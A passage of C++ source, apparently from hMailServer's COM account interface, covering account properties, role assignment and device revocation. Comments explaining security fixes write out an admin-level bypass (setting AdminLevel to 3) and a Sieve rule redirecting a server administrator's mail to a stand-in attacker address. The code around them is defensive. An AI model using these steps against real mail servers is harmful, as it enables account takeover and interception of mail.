      // reachable again: with the level unchanged it still reads ServerAdmin, so the
      // password write is refused too.
      //
      // Putting this inside the Normal/DomainAdmin case - where it first went - was not
      // enough. eAdminLevel is a COM enum, which is to say a long, and neither COM
      // automation nor a vtable call range-checks it. The switch below has no default,
      // so a value matching no case fell straight through to SetAdminLevel() and set the
      // level to something that is neither ServerAdmin nor a valid level at all:
      //
      //    acct.AdminLevel = 3        // matches no case, guard never evaluated
      //    acct.Password = "..."
      //    acct.Save()                // 3 == ServerAdmin(2) is false, both writes allowed
      //
      // which is the same takeover by a different door, and PersistentAccount::SaveObject
      // would have written the 3 to accountadminlevel without validating it either.
      if (object_->GetAdminLevel() == HM::Account::ServerAdmin &&
          !authentication_->GetIsServerAdmin())
         return authentication_->GetAccessDenied();

      // Check that the user has permission to do this change.
      switch (newVal)
      {
      case hAdminLevelNormal:
      case hAdminLevelDomainAdmin:
         {
            // The client wants to give this user normal or domain level
            // rights. This is OK if the user is domain or server admin.
            if (!authentication_->GetIsDomainAdmin() && !authentication_->GetIsServerAdmin())
               return authentication_->GetAccessDenied();

            break;
         }
      case hAdminLevelServerAdmin:
         {
            if (object_->GetAdminLevel() == hAdminLevelServerAdmin)
            {
               // It's OK to set this user to admin since the user already is admin. We
               // don't need to change anything.
               return S_OK;
            }

            if (!authentication_->GetIsServerAdmin())
            {
               // Only server admins are allowed to give other users server admin rights.
               return authentication_->GetAccessDenied();
            }

            break;
         }
      default:
         {
            // Anything else is not an admin level. Refused rather than stored, both
            // because the value would be meaningless in accountadminlevel and because
            // silently accepting it is what let the guard above be walked around.
            return COMError::GenerateError("The specified administration level is not valid.");
         }
      }
   
   
      object_->SetAdminLevel((HM::Account::AdminLevel) newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Rules(IInterfaceRules **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceRules >* pItem = new CComObject<InterfaceRules >();
      pItem->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::Rules> pRules = object_->GetRules();
   
      if (pRules)
      {
         pItem->Attach(pRules);
         pItem->AddRef();
         *pVal = pItem;
      }
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_IMAPFolders(IInterfaceIMAPFolders **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (object_->GetID() == 0)
         return COMError::WithoutMessage(DISP_E_BADINDEX);  
   
      CComObject<InterfaceIMAPFolders>* pItem = new CComObject<InterfaceIMAPFolders >();
      pItem->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::IMAPFolders> pFolders = HM::IMAPFolderContainer::Instance()->GetFoldersForAccount(object_->GetID());
   
      if (pFolders)
      {
         pItem->Attach(pFolders);
         pItem->AddRef();
         *pVal = pItem;
      }
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP 
InterfaceAccount::get_QuotaUsed(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      __int64 accountSizeBytes = AccountSizeCache::Instance()->GetSize(object_->GetID());
   
      __int64 iMaxSize = ((__int64) object_->GetAccountMaxSize()) * 1024; // Convert from MB to KB
      __int64 iCurrentSize = accountSizeBytes / 1024; // Convert from Bytes to KB
   
      int iPercentageUsed = 0;
      
      if (iMaxSize > 0)
         iPercentageUsed = (int) (((float) iCurrentSize/ (float) iMaxSize) * 100);
   
      *pVal = iPercentageUsed;
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardEnabled(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardEnabled() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardEnabled(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardEnabled(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardAddress(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardAddress().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardAddress(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardAddress(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SieveScript(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Sieve scripts are stored as files keyed by the account address, so this
      // property reads directly from SieveStorage (no Save() required).
      *pVal = HM::SieveStorage::GetActiveScript(object_->GetAddress()).AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SieveScript(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // The script is persisted to disk immediately (file-backed, not part of the
      // account row), so this does not require a subsequent Save() - and that is
      // exactly why it needs its own guard.
      //
      // Save() carries the check that stops a domain administrator altering a server
      // administrator's account, for the case its comment describes: a server admin
      // whose mailbox sits inside a domain somebody else administers. Every other
      // sensitive property on this interface is written to object_ and therefore
      // reaches that check. This one goes straight to the filesystem and bypassed it
      // completely.
      //
      // A domain administrator could therefore install
      //
      //    require ["copy"]; redirect :copy "attacker@example.test";
      //
      // on the server administrator's account and receive a copy of all their mail.
      // LocalDelivery reads that file on every delivery, so it takes effect at once,
      // with no save and nothing to review. The same account's password could not be
      // changed - only its mail could be redirected, which is worse.
      if (!authentication_->GetIsServerAdmin())
      {
         if (object_->GetAdminLevel() == HM::Account::ServerAdmin)
            return COMError::GenerateError("You do not have access to change the Sieve script of a server administrator account. Server administrator accounts can only be updated by server administrators.");
      }

      // Reported rather than discarded: SetActiveScript returns whether the file was
      // written, and a disk-full or permission failure otherwise left the caller
      // believing the filter was installed while mail kept being delivered unfiltered.
      if (!HM::SieveStorage::SetActiveScript(object_->GetAddress(), HM::String(newVal)))
         return COMError::GenerateError("The Sieve script could not be written to disk. Check the hMailServer error log.");

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardKeepOriginal(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardKeepOriginal() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardKeepOriginal(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardKeepOriginal(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardAbortSpamFlagged(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardAbortSpamFlagged() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardAbortSpamFlagged(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardAbortSpamFlagged(newVal == VARIANT_TRUE);
      return S_OK;   
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SignatureEnabled(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetEnableSignature() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SignatureEnabled(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetEnableSignature(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SignaturePlainText(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetSignaturePlainText().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SignaturePlainText(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetSignaturePlainText(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SignatureHTML(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetSignatureHTML().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SignatureHTML(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetSignatureHTML(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_PersonFirstName(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetPersonFirstName().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_PersonFirstName(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetPersonFirstName(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_PersonLastName(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetPersonLastName().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_PersonLastName(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetPersonLastName(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_LastLogonTime(VARIANT *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      HM::DateTime dt = Time::GetDateFromSystemDate(object_->GetLastLogonTime());
      
      *pVal  = dt.GetVariant();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::Delete()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      if (!parent_collection_)
         return PersistentAccount::DeleteObject(object_) ? S_OK : S_FALSE;
   
      parent_collection_->DeleteItemByDBID(object_->GetID());
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_AntiSpamEnabled(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetAntiSpamEnabled() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_AntiSpamEnabled(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetAntiSpamEnabled(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SpamMarkThreshold(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetSpamMarkThreshold();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SpamMarkThreshold(long newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Anything below the -1 sentinel would be stored faithfully and then read
      // back as an override of "mark everything", which nobody can have meant.
      object_->SetSpamMarkThreshold(newVal < -1 ? -1 : newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SpamDeleteThreshold(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetSpamDeleteThreshold();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SpamDeleteThreshold(long newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetSpamDeleteThreshold(newVal < -1 ? -1 : newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_RoleName(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // The assignment row, and nothing derived: an account with no row reads
      // as empty, which is how an administrator can tell "holds the domainadmin
      // role" from "is a domain administrator because AdminLevel says so".
      HM::RoleAssignment assignment;

      if (!HM::RoleManager::AssignmentForAccount(object_->GetID(), assignment))
      {
         *pVal = HM::String().AllocSysString();
         return S_OK;
      }

      *pVal = assignment.role_name.AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_RoleName(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->Allows(HM::RolePermission::ManageRoles))
         return authentication_->GetAccessDenied();

      const HM::String wanted = newVal;

      HM::RoleAssignment existing;
      HM::RoleManager::AssignmentForAccount(object_->GetID(), existing);

      // A credential may not hand out authority it has not got, nor take away
      // authority it has not got. Only the server administrator holds
      // ManageRoles today, so this cannot fire yet; it is written now because
      // the day a delegate holds it is the day the check has to already be here.
      if (!HM::RoleManager::Encompasses(authentication_->GetGrant(), HM::RoleManager::GrantForAccount(object_)) ||
          (!wanted.IsEmpty() &&
           !HM::RoleManager::Encompasses(authentication_->GetGrant(), HM::RoleManager::GrantForAssignment(object_, wanted, existing.domains))))
      {
         return COMError::GenerateError("That role holds authority this credential does not, and a credential may not hand out authority it has not got.");
      }

      HM::String error;

      if (wanted.IsEmpty())
      {
         if (!HM::RoleManager::Unassign(object_->GetID(), error))
            return COMError::GenerateError(error);

         return S_OK;
      }

      if (!HM::RoleManager::Assign(object_->GetID(), wanted, existing.domains, error))
         return COMError::GenerateError(error);

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_RoleDomains(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      HM::RoleAssignment assignment;

      if (!HM::RoleManager::AssignmentForAccount(object_->GetID(), assignment))
      {
         *pVal = HM::String().AllocSysString();
         return S_OK;
      }

      *pVal = assignment.domains.AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_RoleDomains(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->Allows(HM::RolePermission::ManageRoles))
         return authentication_->GetAccessDenied();

      HM::RoleAssignment existing;

      if (!HM::RoleManager::AssignmentForAccount(object_->GetID(), existing))
         return COMError::GenerateError("This account holds no role, so there are no domains to confine it to. Set RoleName first.");

      HM::String error;

      if (!HM::RoleManager::Assign(object_->GetID(), existing.role_name, HM::String(newVal), error))
         return COMError::GenerateError(error);

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

// The account's half of the Web Key Directory (docs/OpenPGP.md). Holding a key
// so that a mail client can find it is not the same decision as telling the whole
// internet about it, so the switch is the person's own and is off until it is set.
// The key list is read-only here: keys go in and out through
// Utilities.ImportOpenPGPKey and RemoveOpenPGPKey, which is where the parsing,
// the limits and the audit row are.

STDMETHODIMP InterfaceAccount::get_OpenPGPPublish(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetOpenPGPPublish() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_OpenPGPPublish(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetOpenPGPPublish(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_OpenPGPKeys(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = HM::String(HM::OpenPgpKeyStore::AccountJson(object_)).AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_RolePermissions(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      const HM::RoleGrant grant = HM::RoleManager::GrantForAccount(object_);

      *pVal = HM::String(HM::RoleManager::DescribeGrant(grant)).AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

// The clients that have signed in to this account, as GET /api/v1/me/devices and
// GET /api/v1/accounts/{address}/devices answer it - the same document, built by
// SignInStore, so that COM and REST cannot describe a client differently.
//
// Reading it is the account's own administration, so the question is the one the
// account's other administrative members ask: may this credential administer this
// account's domain. Asking it is also what installs the audit actor.
STDMETHODIMP InterfaceAccount::GetDevices(BSTR *Json)
{
   try
   {
      if (!Json)
         return COMError::GenerateGenericMessage();

      if (!object_)
         return GetAccessDenied();

      if (!authentication_->AllowsForDomain(HM::RolePermission::ViewAccounts, HM::StringParser::ExtractDomain(object_->GetAddress())))
         return authentication_->GetAccessDenied();

      const std::vector<HM::SignInRecord> records = HM::SignInStore::List(object_->GetID());

      HM::String json;
      HM::Unicode::MultiByteToWide(HM::SignInStore::ToJson(records), json);

      *Json = json.AllocSysString();

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

// Ends every session one client of this account holds now. What it does, and what
// it deliberately does not do, is in SignInStore.h; the revoke itself is recorded
// in the audit trail there, once, for every interface that asks.
STDMETHODIMP InterfaceAccount::RevokeDevice(BSTR DeviceID, VARIANT_BOOL RevokeCredential, VARIANT_BOOL *Revoked)
{
   try
   {
      if (!Revoked)
         return COMError::GenerateGenericMessage();

      *Revoked = VARIANT_FALSE;

      if (!object_)
         return GetAccessDenied();

      // Revoking a client can deactivate the app password behind it, which is a
      // change to the account's credentials - so it asks what changing the account
      // asks, not what reading it does.
      if (!authentication_->AllowsForDomain(HM::RolePermission::ManageAccounts, HM::StringParser::ExtractDomain(object_->GetAddress())))
         return authentication_->GetAccessDenied();

      HM::String device = DeviceID;
      device.Trim();

      if (device.IsEmpty())
         return COMError::GenerateError("A device id is required. Account.GetDevices lists them.");

      int connections = 0;
      int sessions = 0;
      bool credentialDisabled = false;

      if (!HM::SignInStore::Revoke(object_->GetID(), device, RevokeCredential == VARIANT_TRUE,
             connections, sessions, credentialDisabled))
         return S_OK;

      *Revoked = VARIANT_TRUE;

      LOG_APPLICATION("COM API: a device of " + object_->GetAddress() + " was revoked.");

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_PushSubscriptionCount(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = (long) HM::PushSubscriptions::CountForAccount(object_->GetID());
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

/*
   Every device of this account, stopped. What a lost phone needs: the
   subscription is the capability to send that device a notification, and the
   person cannot remove it from a device they no longer have.
*/
STDMETHODIMP InterfaceAccount::RemovePushSubscriptions(long *RemovedCount)
{
   try
   {
      HM::AuditScope auditScope(GetAuditActor());

      if (!object_)
         return GetAccessDenied();

      std::vector<HM::PushSubscriptions::Subscription> subscriptions;
      HM::PushSubscriptions::ForAccount(object_->GetID(), subscriptions);

      long removed = 0;
      for (const HM::PushSubscriptions::Subscription &subscription : subscriptions)
      {
         if (HM::PushSubscriptions::Remove(object_->GetID(), subscription.id))
            removed++;
      }

      if (removed > 0)
      {
         // The rows are the person's own and their table is not audited, so the
         // administrator's act is recorded here as an event, under the actor the
         // scope above installed: a lost phone's notifications being stopped is
         // exactly the kind of change somebody later asks who made.
         HM::AuditTrail::Instance()->RecordEvent(_T("account"), object_->GetAddress(), _T("push-subscriptions-removed"),
            HM::Formatter::Format(_T("Web Push notifications were stopped on all {0} device(s)"), removed));

         // This unit sits outside namespace HM, where the logging macro does not resolve.
         using namespace HM;
         LOG_APPLICATION(HM::Formatter::Format("COM: Web Push notifications were stopped for all {0} device(s) of {1}.", removed, object_->GetAddress()));
      }

      *RemovedCount = removed;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}
